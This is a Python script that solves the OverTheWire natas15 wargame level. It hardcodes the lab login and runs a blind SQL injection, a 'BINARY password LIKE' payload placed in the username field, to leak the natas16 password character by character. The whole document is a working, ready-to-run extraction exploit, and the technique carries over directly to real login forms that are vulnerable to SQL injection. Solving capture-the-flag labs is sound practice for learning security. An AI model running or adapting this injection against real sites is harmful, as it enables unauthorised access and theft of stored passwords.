import string as str
import requests as req

allChar = str.ascii_letters + str.digits
# a-z A-Z 0-9

# natas15 login credentials
username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = "http://natas15.natas.labs.overthewire.org/"
session = req.Session()
flaglen = 32

flagpsswd = []
while (True):
    for e in allChar:
        print("Cracking")
        # "".join(flagpsswd) + e
        response = session.post(url, data={"username": 'natas16" AND BINARY password LIKE "' + "".join(flagpsswd) + e + '%" # '}, auth=(username, password))
        '''
        send a post req to the server, we know that user natas16 exists,
        BINARY password for case sensitive letters, LIKE to check if the password
        contains 1 letter
        '''
        content = response.text  # response from server
        if ("user exists" in content):  # password does contain the letter!
            flagpsswd.append(e)
            print("Leaking password ", "".join(flagpsswd))
            break

    if (len(flagpsswd) == flaglen):
        print("Found! ", "".join(flagpsswd))
        break
